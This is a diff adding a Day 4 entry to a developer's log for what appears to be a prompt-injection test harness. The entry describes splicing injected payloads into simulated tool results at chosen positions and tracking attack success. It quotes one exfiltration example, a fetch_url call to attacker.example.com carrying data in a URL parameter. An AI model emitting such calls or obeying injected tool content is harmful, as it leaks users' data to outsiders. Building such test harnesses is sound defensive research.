@@ -2,6 +2,33 @@
 
 Running log of decisions, gotchas, and things to revisit. Newest first.
 
+## Day 4 — real tool simulator + the position knob
+- Corrected the tool set from day 3's guess. The actual three tools are
+  `web_search(query)`, `read_file(path)`, `fetch_url(url)` -- **not**
+  `read_url`/`log_value`, which I'd invented on day 3 to match the
+  pre-existing `tool_call_emission` attack case text before the real spec
+  for this day existed. Updated `agent/prompts.py`'s schemas and system
+  prompt, and `tools/sim.py`'s registry, to match. Rewrote
+  `tool_call_emission`'s `injected_text` in `runner.py` to target
+  `fetch_url` with a URL-parameter exfiltration pattern
+  (`fetch_url(url="https://attacker.example.com/log?data=...")`) instead of
+  a tool that no longer exists.
+- Every tool now takes `injection: str | None` and `position:
+  Literal["top","middle","bottom"]` and splices the payload into several
+  blocks of realistic, domain-appropriate benign content (search-result
+  snippets with titles/URLs, a fake onboarding doc, a fake blog page) via a
+  shared `_splice()` helper -- so "top"/"middle"/"bottom" are meaningful
+  insertion points, not just string concatenation.
+- `ToolResponse` gained `was_poisoned`, `injection_id` (a short hash of the
+  injection text, so repeated payloads group under the same id), and
+  `position`. `RunRecord` gained `position` too, since without it a future
+  position-vs-ASR chart would have to be reverse-engineered from raw
+  transcript text.
+- `position` is threaded all the way through: `runner.py`'s
+  `INJECTION_POSITION` constant -> `agent.loop.run_agent(position=...)` ->
+  every `tool_fn` call. Fixed at `"middle"` for now; a future sweep just
+  needs to loop this constant, not touch the loop or tool code.
+
 ## Day 3 — tool-calling loop, tolerant parser, MALFORMED outcome
 - `agent/prompts.py`: system prompt + 3 tool JSON schemas (`web_search`,
   `read_url`, `log_value`), instructs the model to emit
